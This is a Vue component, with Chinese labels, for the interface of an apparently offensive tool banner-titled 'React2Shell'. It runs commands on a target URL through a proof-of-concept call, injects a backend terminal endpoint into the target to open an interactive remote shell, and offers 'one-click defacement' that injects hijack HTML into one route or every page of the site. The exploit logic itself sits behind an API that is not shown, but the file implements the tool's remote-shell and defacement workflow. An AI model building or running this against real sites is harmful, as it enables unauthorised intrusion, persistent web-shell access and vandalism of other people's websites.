<template>
  <v-container fluid class="poc-view">
    <div class="view-header">
      <h2>POC验证</h2>
    </div>

    <v-row class="view-content" align="stretch">
      <!-- 左侧输入区域 -->
      <v-col cols="12" md="4" class="panel-column left-panel">
        <div class="left-top">
          <v-card class="input-card" elevation="2">
            <v-card-text>
              <v-text-field
                v-model="form.url"
                label="目标URL"
                placeholder="请输入目标URL (例如: http://localhost:3000)"
                variant="outlined"
                density="comfortable"
                class="mb-4"
              />
              <v-text-field
                v-model="form.command"
                label="执行命令"
                placeholder="请输入要执行的命令 (例如: ifconfig)"
                variant="outlined"
                density="comfortable"
                class="mb-4"
              />
              <v-btn color="primary" :loading="isRunning" block size="large" @click="handleExecute">
                <v-icon start>mdi-play</v-icon>
                执行检测
              </v-btn>
            </v-card-text>
          </v-card>
        </div>
        <div class="left-bottom">
          <v-card class="history-card" elevation="2">
            <v-card-text class="history-body">
              <div class="history-header">
                <div class="history-header-left">
                  <v-icon size="18" class="history-icon">mdi-history</v-icon>
                  <span>历史记录</span>
                </div>
                <v-btn
                  v-if="vulnHistory.length > 0"
                  icon
                  size="x-small"
                  variant="text"
                  color="error"
                  @click="clearVulnHistory"
                >
                  <v-icon size="16">mdi-delete-sweep</v-icon>
                </v-btn>
              </div>
              <v-list v-if="!historyLoading" density="comfortable" class="history-list">
                <v-list-item v-for="item in vulnHistory" :key="item" class="history-list-item">
                  <template #prepend>
                    <v-avatar
                      size="28"
                      class="favicon-avatar"
                      :color="faviconCache[item] ? 'white' : 'grey-lighten-3'"
                    >
                      <v-progress-circular
                        v-if="faviconLoading[item]"
                        indeterminate
                        size="16"
                        width="2"
                        color="primary"
                      />
                      <v-img
                        v-else-if="faviconCache[item]"
                        :src="faviconCache[item]"
                        class="favicon-img"
                        cover
                      />
                      <v-icon v-else size="18" color="grey-darken-1">mdi-link-variant</v-icon>
                    </v-avatar>
                  </template>
                  <template #title>
                    <span class="history-url">{{ item }}</span>
                  </template>
                  <template #append>
                    <v-btn icon size="small" variant="text" @click.stop="handleHistorySelect(item)">
                      <v-icon size="18">mdi-arrow-up</v-icon>
                    </v-btn>
                    <v-menu>
                      <template #activator="{ props }">
                        <v-btn icon size="small" variant="text" v-bind="props">
                          <v-icon size="18">mdi-dots-vertical</v-icon>
                        </v-btn>
                      </template>
                      <v-list density="compact">
                        <v-list-item @click="openInBrowser(item)">
                          <template #prepend>
                            <v-icon size="18">mdi-open-in-new</v-icon>
                          </template>
                          <v-list-item-title>在浏览器中打开</v-list-item-title>
                        </v-list-item>
                        <v-list-item @click="removeVulnHistory(item)">
                          <template #prepend>
                            <v-icon size="18" color="error">mdi-delete</v-icon>
                          </template>
                          <v-list-item-title class="text-error">删除</v-list-item-title>
                        </v-list-item>
                      </v-list>
                    </v-menu>
                  </template>
                </v-list-item>
                <div v-if="vulnHistory.length === 0" class="history-empty">
                  <v-icon size="56" color="grey">mdi-history</v-icon>
                  <p>暂无记录</p>
                </div>
              </v-list>
              <div v-else class="history-loading">
                <v-progress-circular indeterminate color="primary" size="32"></v-progress-circular>
                <p>加载中...</p>
              </div>
            </v-card-text>
          </v-card>
        </div>
      </v-col>

      <!-- 右侧结果区域 -->
      <v-col cols="12" md="8" class="panel-column right-panel">
        <!-- 状态码和检测结果 -->
        <div class="right-top">
          <v-row class="status-row" align="start">
            <v-col cols="6">
              <v-card
                :color="statusCardColor"
                variant="elevated"
                elevation="2"
                class="status-card outlined"
              >
                <v-card-text class="status-card-text">
                  <div class="status-content">
                    <v-progress-circular
                      v-if="isRunning"
                      indeterminate
                      :color="statusIconColor"
                      size="24"
                      width="2"
                    />
                    <v-icon v-else :color="statusIconColor" size="24">
                      {{ statusIcon }}
                    </v-icon>
                    <div class="status-text">
                      <div class="status-label">状态码</div>
                      <div class="status-value">{{ statusText }}</div>
                    </div>
                  </div>
                </v-card-text>
              </v-card>
            </v-col>

            <v-col cols="6">
              <v-card
                :color="resultCardColor"
                variant="elevated"
                elevation="2"
                class="result-card outlined"
              >
                <v-card-text class="status-card-text">
                  <div class="status-content">
                    <v-progress-circular
                      v-if="isRunning"
                      indeterminate
                      :color="resultIconColor"
                      size="24"
                      width="2"
                    />
                    <v-icon v-else :color="resultIconColor" size="24">
                      {{ resultIcon }}
                    </v-icon>
                    <div class="status-text">
                      <div class="status-label">漏洞检测</div>
                      <div class="status-value">{{ resultText }}</div>
                    </div>
                  </div>
                </v-card-text>
              </v-card>
            </v-col>
          </v-row>
        </div>

        <!-- Tab 切换 -->
        <div class="right-bottom">
          <v-card class="result-tabs" elevation="2">
            <v-tabs
              v-model="activeTab"
              bg-color="transparent"
              density="comfortable"
              class="tabs-bar"
            >
              <v-tab value="response" class="tab-text">完整响应</v-tab>
              <v-tab value="output" class="tab-text">命令回显</v-tab>
              <v-tab value="terminal" class="tab-text">虚拟终端</v-tab>
              <v-tab v-if="pocHijackEnabled" value="hijack" class="tab-text">
                <v-icon start size="18">mdi-skull-crossbones</v-icon>
                一键挂黑
              </v-tab>
            </v-tabs>

            <div class="tab-body">
              <v-window v-model="activeTab" class="tab-window">
                <v-window-item value="response" class="tab-pane">
                  <v-card-text class="tab-pane-text pane-surface">
                    <div v-if="!hasExecuted" class="empty-state">
                      <v-icon size="64" color="grey">mdi-lock</v-icon>
                      <p>等待执行POC后显示完整响应</p>
                    </div>
                    <div v-else class="response-container">
                      <div class="response-view-toggle">
                        <v-btn-toggle
                          v-model="responseViewMode"
                          mandatory
                          density="compact"
                          variant="outlined"
                          divided
                        >
                          <v-btn value="source" size="small">
                            <v-icon start size="18">mdi-code-tags</v-icon>
                            源码视图
                          </v-btn>
                          <v-btn value="preview" size="small">
                            <v-icon start size="18">mdi-web</v-icon>
                            网页视图
                          </v-btn>
                        </v-btn-toggle>
                      </div>
                      <v-card variant="flat" class="response-card">
                        <v-card-text class="pane-card-text">
                          <div v-if="responseViewMode === 'source'" class="source-view-container">
                            <div class="pre-scroll">
                              <pre
                                v-if="responseText"
                                class="response-text hljs"
                                v-html="highlightedResponse"
                              ></pre>
                              <pre v-else class="response-text">等待执行...</pre>
                            </div>
                          </div>
                          <div v-else class="preview-scroll">
                            <iframe
                              :srcdoc="responseText"
                              class="response-iframe"
                              sandbox="allow-same-origin"
                            ></iframe>
                          </div>
                        </v-card-text>
                      </v-card>
                    </div>
                  </v-card-text>
                </v-window-item>

                <v-window-item value="output" class="tab-pane">
                  <v-card-text class="tab-pane-text pane-surface">
                    <div v-if="!hasExecuted || (hasExecuted && !isVulnerable)" class="empty-state">
                      <v-icon size="64" color="grey">mdi-lock</v-icon>
                      <p v-if="!hasExecuted">等待执行POC后显示命令回显</p>
                      <p v-else>未检测到漏洞，无命令回显</p>
                    </div>
                    <v-card v-else color="surface" variant="flat" class="output-card">
                      <v-card-text class="pane-card-text">
                        <div class="pre-scroll">
                          <pre class="output-text" :class="outputTextClass">{{
                            outputText || '未提取到命令回显'
                          }}</pre>
                        </div>
                      </v-card-text>
                    </v-card>
                  </v-card-text>
                </v-window-item>

                <v-window-item value="terminal" class="tab-pane">
                  <v-card-text class="tab-pane-text pane-surface">
                    <div v-if="!hasExecuted" class="empty-state">
                      <v-icon size="64" color="grey">mdi-lock</v-icon>
                      <p>等待执行POC后显示虚拟终端</p>
                    </div>
                    <div v-else-if="!isVulnerable" class="empty-state">
                      <v-icon size="64" color="grey">mdi-lock</v-icon>
                      <p>确认存在漏洞后即可使用虚拟终端</p>
                    </div>
                    <div v-else-if="targetPlatform === 'win32'" class="empty-state">
                      <v-icon size="64" color="warning">mdi-microsoft-windows</v-icon>
                      <p>目标服务器为 Windows 平台</p>
                      <p class="text-caption text-grey">虚拟终端功能暂不支持 Windows 系统</p>
                    </div>
                    <div v-else class="terminal-content">
                      <div ref="xtermContainer" class="xterm-container"></div>
                    </div>
                  </v-card-text>
                </v-window-item>

                <v-window-item v-if="pocHijackEnabled" value="hijack" class="tab-pane">
                  <v-card-text class="tab-pane-text pane-surface">
                    <!-- 未执行POC的空状态 -->
                    <div v-if="!hasExecuted" class="empty-state">
                      <v-icon size="64" color="grey">mdi-skull-crossbones-outline</v-icon>
                      <p>等待执行POC后显示一键挂黑功能</p>
                    </div>
                    <!-- 未检测到漏洞的空状态 -->
                    <div v-else-if="!isVulnerable" class="empty-state">
                      <v-icon size="64" color="grey">mdi-shield-check</v-icon>
                      <p>未检测到漏洞，无法使用一键挂黑功能</p>
                    </div>
                    <!-- 检测到漏洞，显示编辑器 -->
                    <div v-else class="hijack-editor-container">
                      <!-- 右上角操作按钮 -->
                      <div class="hijack-toolbar">
                        <v-tooltip text="在弹窗中预览页面效果" location="bottom">
                          <template #activator="{ props }">
                            <v-btn
                              color="primary"
                              size="small"
                              variant="tonal"
                              :disabled="!form.url"
                              v-bind="props"
                              @click="previewHijack"
                            >
                              <v-icon start size="18">mdi-eye-outline</v-icon>
                              预览
                            </v-btn>
                          </template>
                        </v-tooltip>
                        <v-tooltip text="注入临时路由并在浏览器中测试" location="bottom">
                          <template #activator="{ props }">
                            <v-btn
                              color="success"
                              size="small"
                              variant="tonal"
                              :disabled="!form.url || !isVulnerable"
                              v-bind="props"
                              @click="testHijack"
                            >
                              <v-icon start size="18">mdi-open-in-new</v-icon>
                              测试
                            </v-btn>
                          </template>
                        </v-tooltip>
                        <v-tooltip text="注入挂黑代码（可反复注入覆盖）" location="bottom">
                          <template #activator="{ props }">
                            <v-btn
                              color="error"
                              size="small"
                              :loading="isHijacking"
                              :disabled="!isVulnerable"
                              v-bind="props"
                              @click="showInjectDialog"
                            >
                              <v-icon start size="18">mdi-upload</v-icon>
                              注入
                            </v-btn>
                          </template>
                        </v-tooltip>
                        <v-divider vertical class="mx-2" />
                        <v-tooltip text="清除所有劫持，恢复网站正常" location="bottom">
                          <template #activator="{ props }">
                            <v-btn
                              color="warning"
                              size="small"
                              variant="tonal"
                              :loading="isRestoring"
                              :disabled="!isVulnerable"
                              v-bind="props"
                              @click="showRestoreDialog"
                            >
                              <v-icon start size="18">mdi-restore</v-icon>
                              恢复
                            </v-btn>
                          </template>
                        </v-tooltip>
                      </div>

                      <!-- Monaco 编辑器 -->
                      <div ref="hijackEditorContainer" class="hijack-monaco-editor"></div>
                    </div>
                  </v-card-text>
                </v-window-item>
              </v-window>
            </div>
          </v-card>
        </div>
      </v-col>
    </v-row>

    <!-- Snackbar 提示 -->
    <v-snackbar v-model="snackbar.show" :color="snackbar.color" :timeout="3000" location="top">
      {{ snackbar.text }}
    </v-snackbar>

    <!-- 注入模式选择对话框 -->
    <v-dialog v-model="showHijackInjectDialog" max-width="500">
      <v-card>
        <v-card-title class="text-h6 d-flex align-center">
          <v-icon color="error" class="mr-2">mdi-skull-crossbones</v-icon>
          选择注入模式
        </v-card-title>
        <v-card-text>
          <v-radio-group v-model="hijackRouteMode">
            <v-radio value="specific" color="primary">
              <template #label>
                <div>
                  <div class="font-weight-medium">指定路由</div>
                  <div class="text-caption text-grey">只劫持特定路径的页面</div>
                </div>
              </template>
            </v-radio>
            <v-text-field
              v-if="hijackRouteMode === 'specific'"
              v-model="hijackTargetRoute"
              label="目标路由"
              placeholder="/about"
              variant="outlined"
              density="compact"
              class="mt-2 ml-8"
            />
            <v-radio value="global" color="error" class="mt-3">
              <template #label>
                <div>
                  <div class="font-weight-medium">全局劫持</div>
                  <div class="text-caption text-grey">劫持所有路由（危险操作）</div>
                </div>
              </template>
            </v-radio>
          </v-radio-group>
          <v-alert
            v-if="hijackRouteMode === 'global'"
            type="warning"
            density="compact"
            class="mt-3"
          >
            全局模式将劫持目标网站的所有页面！
          </v-alert>
        </v-card-text>
        <v-card-actions>
          <v-spacer />
          <v-btn text @click="showHijackInjectDialog = false">取消</v-btn>
          <v-btn color="error" :loading="isHijacking" @click="confirmInjectHijack">
            <v-icon start>mdi-upload</v-icon>
            确认注入
          </v-btn>
        </v-card-actions>
      </v-card>
    </v-dialog>

    <!-- 预览对话框 -->
    <v-dialog v-model="showHijackPreviewDialog" max-width="900" max-height="700">
      <v-card>
        <v-card-title class="d-flex align-center">
          <v-icon class="mr-2">mdi-eye-outline</v-icon>
          预览效果
          <v-spacer />
          <v-btn icon size="small" variant="text" @click="showHijackPreviewDialog = false">
            <v-icon>mdi-close</v-icon>
          </v-btn>
        </v-card-title>
        <v-card-text class="pa-0">
          <iframe
            :srcdoc="hijackHtmlContent"
            class="hijack-preview-iframe"
            sandbox="allow-scripts"
          ></iframe>
        </v-card-text>
      </v-card>
    </v-dialog>

    <!-- 恢复路由确认对话框 -->
    <v-dialog v-model="showHijackRestoreDialog" max-width="500">
      <v-card>
        <v-card-title class="text-h6 d-flex align-center"> 恢复网站路由 </v-card-title>
        <v-card-text>
          <v-alert type="info" density="compact" class="mb-3">
            此操作将清除所有已注入的路由劫持代码，网站将恢复正常访问。
          </v-alert>
          <p class="text-body-2">确认要恢复网站路由吗？</p>
        </v-card-text>
        <v-card-actions>
          <v-spacer />
          <v-btn text @click="showHijackRestoreDialog = false">取消</v-btn>
          <v-btn color="warning" :loading="isRestoring" @click="confirmRestoreHijack">
            <v-icon start>mdi-restore</v-icon>
            确认恢复
          </v-btn>
        </v-card-actions>
      </v-card>
    </v-dialog>
  </v-container>
</template>

<script setup>
import { ref, computed, inject, nextTick, watch, onBeforeUnmount, onMounted } from 'vue'
import hljs from 'highlight.js/lib/common'
import 'highlight.js/styles/github.css'
import { Terminal } from 'xterm'
import { FitAddon } from 'xterm-addon-fit'
import { WebLinksAddon } from 'xterm-addon-web-links'
import 'xterm/css/xterm.css'

// Base64 编码函数（浏览器环境）
const base64Encode = (str) => {
  return btoa(unescape(encodeURIComponent(str)))
}

// 注入全局状态
const isVulnerable = inject('isVulnerable', ref(false))
const currentUrl = inject('currentUrl', ref(''))

// 检查是否启用一键挂黑功能（从设置中读取）
const pocHijackEnabled = ref(false)

const form = ref({
  url: 'http://localhost:3000',
  command: 'ifconfig'
})

const vulnHistory = ref([])
const historyLoading = ref(false)
const faviconCache = ref({})

const isRunning = ref(false)
const hasExecuted = ref(false)
const statusCode = ref(null)
const outputText = ref('')
const responseText = ref('')
const commandFailed = ref(false)
const activeTab = ref('response')
const xtermContainer = ref(null)
const responseViewMode = ref('source')
const targetPlatform = ref(null) // 目标平台信息

// xterm.js 相关
let terminal = null
let fitAddon = null
let terminalInitialized = false
let terminalWebSocket = null
let terminalSessionId = null
let terminalConnecting = false

// 一键挂黑相关
const hijackRouteMode = ref('specific')
const hijackTargetRoute = ref('/')
const isHijacking = ref(false)
const hijackEditorContainer = ref(null)
const showHijackInjectDialog = ref(false)
const showHijackPreviewDialog = ref(false)
const showHijackRestoreDialog = ref(false)
const isRestoring = ref(false)
let hijackEditor = null

// const hijackRouteModes = [
//   { title: '指定路由', value: 'specific' },
//   { title: '全局劫持', value: 'global' }
// ]

const getDefaultHijackHtml = () => {
  return ''
}

const hijackHtmlContent = ref(getDefaultHijackHtml())
const highlightedResponse = computed(() => {
  if (!responseText.value) return ''
  try {
    const res = hljs.highlightAuto(responseText.value)
    return res.value
  } catch {
    return responseText.value
  }
})

const snackbar = ref({
  show: false,
  text: '',
  color: 'info'
})

const outputTextClass = computed(() => {
  if (!hasExecuted.value) return ''
  return commandFailed.value ? 'text-error' : 'text-success'
})

const faviconError = ref({})
const faviconLoading = ref({})

const addVulnHistory = async (url) => {
  const trimmed = url?.trim()
  if (!trimmed) return

  try {
    const result = await window.api.storage.addHistoryItem(trimmed)
    if (result.success && result.history) {
      vulnHistory.value = result.history
      // 加载新添加项的 favicon
      loadFavicon(trimmed)
    } else {
      // 降级到本地内存
      if (!vulnHistory.value.includes(trimmed)) {
        vulnHistory.value.unshift(trimmed)
      }
    }
  } catch (error) {
    console.error('添加历史记录失败:', error)
    // 降级到本地内存
    if (!vulnHistory.value.includes(trimmed)) {
      vulnHistory.value.unshift(trimmed)
    }
  }
}

const removeVulnHistory = async (url) => {
  try {
    const result = await window.api.storage.removeHistoryItem(url)
    if (result.success && result.history) {
      vulnHistory.value = result.history
      showSnackbar('已删除历史记录', 'success')
    }
  } catch (error) {
    console.error('删除历史记录失败:', error)
    showSnackbar('删除失败: ' + error.message, 'error')
  }
}

const clearVulnHistory = async () => {
  try {
    const result = await window.api.storage.clearHistory()
    if (result.success) {
      vulnHistory.value = []
      showSnackbar('历史记录已清空', 'success')
    }
  } catch (error) {
    console.error('清空历史记录失败:', error)
    showSnackbar('清空失败: ' + error.message, 'error')
  }
}

const loadVulnHistory = async () => {
  historyLoading.value = true
  try {
    const result = await window.api.storage.loadHistory()
    if (result.success && result.history) {
      vulnHistory.value = result.history

      // 预加载所有 favicon
      result.history.forEach((url) => {
        loadFavicon(url)
      })
    }
  } catch (error) {
    console.error('加载历史记录失败:', error)
  } finally {
    historyLoading.value = false
  }
}

const loadFavicon = async (url) => {
  if (faviconLoading.value[url] || faviconCache.value[url]) {
    return
  }

  // 检查 API 是否可用
  if (!window.api?.storage?.fetchFavicon) {
    console.error('fetchFavicon API 不可用，请重启应用')
    faviconError.value[url] = true
    faviconError.value = { ...faviconError.value }
    return
  }

  faviconLoading.value[url] = true

  try {
    const result = await window.api.storage.fetchFavicon(url)

    if (result.success && result.dataUrl) {
      faviconCache.value[url] = result.dataUrl
      // 触发响应式更新
      faviconCache.value = { ...faviconCache.value }
    } else {
      faviconError.value[url] = true
      faviconError.value = { ...faviconError.value }
    }
  } catch (error) {
    console.error('加载 favicon 失败:', error)
    faviconError.value[url] = true
    faviconError.value = { ...faviconError.value }
  } finally {
    faviconLoading.value[url] = false
  }
}

const handleHistorySelect = (url) => {
  form.value.url = url
  currentUrl.value = url
  showSnackbar('已填充历史URL', 'info')
}

const openInBrowser = (url) => {
  if (!url) return
  if (window.api?.openExternal) {
    window.api.openExternal(url)
  } else {
    window.open(url, '_blank')
  }
}

const showSnackbar = (text, color = 'info') => {
  snackbar.value = { show: true, text, color }
}

const statusCardColor = computed(() => {
  if (isRunning.value) return 'info-lighten-5'
  if (!statusCode.value) return 'surface'
  if (statusCode.value === 0) return 'error-lighten-5'
  if (statusCode.value >= 200 && statusCode.value < 300) return 'success-lighten-5'
  if (statusCode.value >= 300 && statusCode.value < 400) return 'info-lighten-5'
  if (statusCode.value >= 400 && statusCode.value < 500) return 'warning-lighten-5'
  if (statusCode.value >= 500) return 'error-lighten-5'
  return 'grey-lighten-4'
})

const resultCardColor = computed(() => {
  if (isRunning.value) return 'info-lighten-5'
  if (!statusCode.value) return 'surface'
  return isVulnerable.value ? 'error-lighten-5' : 'success-lighten-5'
})

const statusIcon = computed(() => {
  if (isRunning.value) return 'mdi-loading'
  if (!statusCode.value) return 'mdi-clock-outline'
  if (statusCode.value === 0) return 'mdi-alert-circle-outline'
  if (statusCode.value >= 200 && statusCode.value < 300) return 'mdi-check-circle'
  if (statusCode.value >= 300 && statusCode.value < 400) return 'mdi-information'
  if (statusCode.value >= 400 && statusCode.value < 500) return 'mdi-alert-circle-outline'
  if (statusCode.value >= 500) return 'mdi-alert-circle-outline'
  return 'mdi-clock-outline'
})

const statusIconColor = computed(() => {
  if (isRunning.value) return 'info'
  if (!statusCode.value) return 'info'
  if (statusCode.value === 0) return 'error'
  if (statusCode.value >= 200 && statusCode.value < 300) return 'success'
  if (statusCode.value >= 300 && statusCode.value < 400) return 'info'
  if (statusCode.value >= 400 && statusCode.value < 500) return 'warning'
  if (statusCode.value >= 500) return 'error'
  return 'grey'
})

const resultIcon = computed(() => {
  if (isRunning.value) return 'mdi-loading'
  if (!statusCode.value) return 'mdi-clock-outline'
  return isVulnerable.value ? 'mdi-alert-circle' : 'mdi-check-circle'
})

const resultIconColor = computed(() => {
  if (isRunning.value) return 'info'
  if (!statusCode.value) return 'info'
  return isVulnerable.value ? 'error' : 'success'
})

const statusText = computed(() => {
  if (isRunning.value) return '正在检测...'
  if (!statusCode.value && !hasExecuted.value) return '等待执行...'
  if (!statusCode.value) return '检测中...'
  return statusCode.value.toString()
})

const resultText = computed(() => {
  if (isRunning.value) return '正在检测...'
  if (!statusCode.value && !hasExecuted.value) return '等待检测...'
  if (!statusCode.value) return '检测中...'
  if (isVulnerable.value) return '存在漏洞 (Vulnerable)'
  return '未检测到漏洞 (Not Vulnerable)'
})

const handleExecute = async () => {
  if (!form.value.url || !form.value.command) {
    showSnackbar('请填写URL和命令', 'warning')
    return
  }

  isRunning.value = true
  hasExecuted.value = true
  statusCode.value = null
  isVulnerable.value = false
  outputText.value = ''
  responseText.value = ''
  commandFailed.value = false
  targetPlatform.value = null

  try {
    const result = await window.api.executePOC(form.value.url, form.value.command)

    if (result.success) {
      const data = result.data
      statusCode.value = data.status_code
      isVulnerable.value = data.is_vulnerable
      outputText.value = data.digest_content || '未提取到命令回显'
      responseText.value = data.response || ''
      commandFailed.value = data.command_failed
      targetPlatform.value = data.platform || null
      console.log(
        'POC 执行结果 - platform:',
        data.platform,
        'targetPlatform:',
        targetPlatform.value
      )

      // 自动切换 Tab
      if (isVulnerable.value) {
        activeTab.value = 'output'
        addVulnHistory(form.value.url)
        // 初始化终端（延迟到切换到终端标签时）
        terminalInitialized = false
      } else {
        // 漏洞不存在时，只显示完整响应
        activeTab.value = 'response'
      }

      // 更新全局状态和当前URL
      currentUrl.value = form.value.url
    } else {
      showSnackbar(`执行失败: ${result.error}`, 'error')
      statusCode.value = 0
    }
  } catch (error) {
    showSnackbar(`执行错误: ${error.message}`, 'error')
    statusCode.value = 0
  } finally {
    isRunning.value = false
  }
}

// 初始化 xterm.js 终端 - 使用 HTTP SSE
const initTerminal = async () => {
  if (!xtermContainer.value || terminalInitialized || terminalConnecting) return

  // 如果目标平台是 Windows，不初始化终端
  if (targetPlatform.value === 'win32') {
    console.log('目标平台为 Windows，跳过虚拟终端初始化')
    return
  }

  terminalConnecting = true

  try {
    // 清理旧的 SSE 监听器
    if (window.api?.terminal?.removeSSEListeners) {
      window.api.terminal.removeSSEListeners()
      console.log('已清理旧的 SSE 监听器')
    }

    // 清理旧终端
    if (terminal) {
      terminal.dispose()
      terminal = null
    }

    if (terminalWebSocket) {
      terminalWebSocket.close()
      terminalWebSocket = null
    }

    // 创建新终端
    terminal = new Terminal({
      cursorBlink: true,
      fontSize: 14,
      fontFamily: 'Consolas, "Courier New", monospace',
      convertEol: true,
      scrollback: 1000,
      theme: {
        background: '#1e1e1e',
        foreground: '#d4d4d4',
        cursor: '#d4d4d4',
        selection: '#264f78',
        black: '#000000',
        red: '#cd3131',
        green: '#0dbc79',
        yellow: '#e5e510',
        blue: '#2472c8',
        magenta: '#bc3fbc',
        cyan: '#11a8cd',
        white: '#e5e5e5',
        brightBlack: '#666666',
        brightRed: '#f14c4c',
        brightGreen: '#23d18b',
        brightYellow: '#f5f543',
        brightBlue: '#3b8eea',
        brightMagenta: '#d670d6',
        brightCyan: '#29b8db',
        brightWhite: '#e5e5e5'
      },
      cols: 80,
      rows: 24
    })

    // 添加插件
    fitAddon = new FitAddon()
    terminal.loadAddon(fitAddon)
    terminal.loadAddon(new WebLinksAddon())

    // 挂载到容器
    terminal.open(xtermContainer.value)

    // 等待 DOM 更新后再 fit
    await nextTick()
    fitAddon.fit()

    // 显示 ASCII 艺术字
    terminal.writeln('\x1b[1;36m')
    terminal.writeln('    ____                  __  ___   _____ __         ____')
    terminal.writeln('   / __ \\___  ____ ______/ /_|__ \\ / ___// /_  ___  / / /')
    terminal.writeln('  / /_/ / _ \\/ __ `/ ___/ __/__/ / \\__ \\/ __ \\/ _ \\/ / / ')
    terminal.writeln(' / _, _/  __/ /_/ / /__/ /_ / __/ ___/ / / / /  __/ / /  ')
    terminal.writeln('/_/ |_|\\___/\\__,_/\\___/\\__//____//____/_/ /_/\\___/_/_/   ')
    terminal.writeln('\x1b[0m')
    terminal.writeln('\x1b[90m目标: ' + currentUrl.value + '\x1b[0m')
    terminal.writeln('')

    terminal.writeln('\x1b[36m[*]\x1b[0m 正在初始化虚拟终端，请稍候...')

    const apiPath = '/_next/data/terminal'
    const apiUrl = currentUrl.value + apiPath

    // 先尝试创建会话（检测后端是否已注入）
    terminal.writeln('\x1b[36m[*]\x1b[0m 正在检测虚拟终端后端服务...')

    let createResult = await window.api.terminal.createSession(apiUrl + '?action=create')
    let needsInjection = !createResult.success

    // 如果创建失败，说明后端未注入，执行注入
    if (needsInjection) {
      terminal.writeln('\x1b[33m[*]\x1b[0m 后端服务不存在，正在注入...')

      const injectResult = await window.api.terminal.create(currentUrl.value, apiPath)

      if (!injectResult.success) {
        terminal.writeln('\x1b[31m[!]\x1b[0m 后端注入失败: ' + injectResult.error)
        terminal.writeln('\x1b[90m    提示: 请确保目标服务器存在漏洞\x1b[0m')
        terminalConnecting = false
        return
      }

      terminal.writeln('\x1b[32m[✓]\x1b[0m 后端注入成功')

      // 注入成功后再次尝试创建会话
      terminal.writeln('\x1b[36m[*]\x1b[0m 正在创建会话...')
      createResult = await window.api.terminal.createSession(apiUrl + '?action=create')

      if (!createResult.success) {
        terminal.writeln('\x1b[31m[!]\x1b[0m 创建会话失败: ' + (createResult.error || '未知错误'))
        terminalConnecting = false
        return
      }
    } else {
      terminal.writeln('\x1b[32m[✓]\x1b[0m 检测到后端服务已存在')
      terminal.writeln('\x1b[36m[*]\x1b[0m 正在创建会话...')
    }

    terminalSessionId = createResult.sessionId

    terminal.writeln('\x1b[32m[✓]\x1b[0m 会话创建成功')
    terminal.writeln('\x1b[32m[✓]\x1b[0m 虚拟终端初始化完成')
    terminal.writeln('')
    terminal.writeln('\x1b[1;33m按 Enter 进入虚拟终端\x1b[0m')
    terminal.writeln('')

    // 等待用户按 Enter 键
    let waitingForEnter = true
    const enterKeyDisposable = terminal.onData((data) => {
      if (waitingForEnter && (data === '\r' || data === '\n')) {
        waitingForEnter = false
        enterKeyDisposable.dispose()
        connectSSE()
      }
    })

    // 连接 SSE 流的函数
    const connectSSE = async () => {
      terminal.writeln('\x1b[36m[*]\x1b[0m 正在连接虚拟终端...')
      terminal.writeln('')

      const sseUrl = apiUrl + '?action=stream&sid=' + terminalSessionId
      console.log('Connecting to SSE:', sseUrl)

      // 设置 SSE 事件监听器
      let sseConnectionId = null

      // 添加超时处理
      const connectTimeout = setTimeout(() => {
        if (!terminalInitialized) {
          terminal.writeln('\x1b[31m✗ SSE 连接超时\x1b[0m')
          terminal.writeln('\x1b[90m提示: 后端可能未成功注入\x1b[0m')
          if (sseConnectionId) {
            window.api.terminal.closeSSE(sseConnectionId)
          }
        }
      }, 10000) // 10秒超时

      // 监听 SSE 打开事件
      window.api.terminal.onSSEOpen((data) => {
        if (data.connectionId === sseConnectionId) {
          clearTimeout(connectTimeout)
          console.log('SSE connected successfully')
        }
      })

      // 监听 SSE 消息
      window.api.terminal.onSSEMessage((msgData) => {
        if (msgData.connectionId !== sseConnectionId) return

        try {
          const data = JSON.parse(msgData.data)
          console.log('SSE message:', data)

          if (data.type === 'connected') {
            console.log('Terminal connected')
            // 清空终端，准备接收 shell 输出
            terminal.clear()
            terminalInitialized = true

            // 自动发送回车键以显示提示符
            setTimeout(async () => {
              try {
                const inputUrl = apiUrl + '?action=input&sid=' + terminalSessionId
                await window.api.terminal.sendInput(inputUrl, '\n')
              } catch (error) {
                console.error('自动发送回车失败:', error)
              }
            }, 500)
          } else if (data.type === 'stdout' || data.type === 'stderr' || data.type === 'echo') {
            // 解码 base64 输出（正确处理 UTF-8）
            try {
              // 使用 Uint8Array 正确解码 UTF-8
              const binaryString = atob(data.data)
              const bytes = new Uint8Array(binaryString.length)
              for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i)
              }
              const text = new TextDecoder('utf-8').decode(bytes)
              if (terminal) {
                terminal.write(text)
              }
            } catch (error) {
              console.error('解码输出失败:', error)
              // 降级到简单解码
              const text = atob(data.data)
              if (terminal) {
                terminal.write(text)
              }
            }
          } else if (data.type === 'exit') {
            if (terminal) {
              terminal.writeln('\r\n\x1b[33m进程已退出，代码: ' + data.code + '\x1b[0m')
            }
            terminalInitialized = false
          }
        } catch (error) {
          console.error('解析 SSE 消息失败:', error)
        }
      })

      // 监听 SSE 错误
      window.api.terminal.onSSEError((data) => {
        if (data.connectionId !== sseConnectionId) return

        clearTimeout(connectTimeout)
        console.error('SSE 错误:', data.error)

        if (terminal) {
          terminal.writeln('\r\n\x1b[31m✗ SSE 连接错误\x1b[0m')
          terminal.writeln('\x1b[90m提示: ' + data.error + '\x1b[0m')
        }
      })

      // 监听 SSE 关闭
      window.api.terminal.onSSEClose((data) => {
        if (data.connectionId !== sseConnectionId) return

        console.log('SSE 连接关闭')
        if (terminal && terminalInitialized) {
          terminal.writeln('\r\n\x1b[33m连接已关闭\x1b[0m')
        }
        terminalInitialized = false
      })

      // 通过主进程连接 SSE（避免 CORS）
      try {
        const result = await window.api.terminal.connectSSE(sseUrl)
        if (result.success) {
          sseConnectionId = result.connectionId
          console.log('SSE 连接已建立，ID:', sseConnectionId)
        } else {
          clearTimeout(connectTimeout)
          terminal.writeln('\x1b[31m✗ 连接失败: ' + (result.error || '未知错误') + '\x1b[0m')
        }
      } catch (error) {
        clearTimeout(connectTimeout)
        console.error('连接 SSE 失败:', error)
        terminal.writeln('\x1b[31m✗ 连接异常: ' + error.message + '\x1b[0m')
      }

      // 监听用户输入 - 通过 IPC 发送（避免 CORS）
      terminal.onData(async (data) => {
        if (terminalInitialized && terminalSessionId) {
          try {
            const inputUrl = apiUrl + '?action=input&sid=' + terminalSessionId
            await window.api.terminal.sendInput(inputUrl, data)
          } catch (error) {
            console.error('发送输入失败:', error)
          }
        }
      })
    }

    // 监听窗口大小变化
    window.addEventListener('resize', handleTerminalResize)
  } catch (error) {
    console.error('初始化终端失败:', error)
    if (terminal) {
      terminal.writeln('\x1b[31m错误: ' + error.message + '\x1b[0m')
    }
